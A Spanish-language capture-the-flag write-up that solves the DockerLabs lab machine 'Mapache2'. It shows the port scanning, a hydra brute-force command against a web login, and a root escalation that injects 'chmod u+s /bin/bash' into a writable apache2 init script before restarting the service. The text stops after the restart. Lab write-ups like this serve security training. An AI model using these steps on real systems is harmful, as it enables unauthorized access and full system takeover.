## Introducción

Este documento presenta la resolución completa de la máquina **Mapache2**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un formulario de login vulnerable a ataques de fuerza bruta, permitiendo obtener credenciales de acceso. Mediante un diccionario generado con `cewl`, se obtiene acceso al panel web, que revela una pista con credenciales adicionales. Estas credenciales permiten el acceso SSH como el usuario `Kinder`.
Una vez dentro, se identifica que el usuario puede reiniciar el servicio `apache2` sin contraseña, y el script `/etc/init.d/apache2` es modificable. Se inyecta código para establecer el bit SUID en `/bin/bash`, reiniciando el servicio y obteniendo acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Mapache2.zip
sudo bash auto_deploy.sh Mapache2.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Mapache2/{content,exploits,nmap,scripts}
cd Mapache2
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP
* **3036/tcp** — MySQL

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1769662966/Ports_m2sqs2.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80,3036 172.17.0.2
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Diccionario personalizado

Se genera un diccionario con `cewl`:

```bash
cewl http://172.17.0.2/ -w dic.txt
```

### 2.2 Fuerza bruta en formulario web

```bash
hydra -l medusa -P dic.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1769662966/Hydra_fjmabo.png)

### 2.3 Pista adicional

Se accede al panel y se encuentra una pista con la credencial `Kinder`:

![Hint](https://res.cloudinary.com/dewqswzke/image/upload/v1769662966/Hint_l3ntto.png)

## Paso 3 — Escalada de privilegios

### 3.1 De Kinder → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1769662975/Sudo-l_l40yic.png)

Se puede reiniciar `apache2` sin contraseña. El script `/etc/init.d/apache2` es modificable.

Se inyecta código:

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Se reinicia el servicio:

```bash
sudo service apache2 restart
```
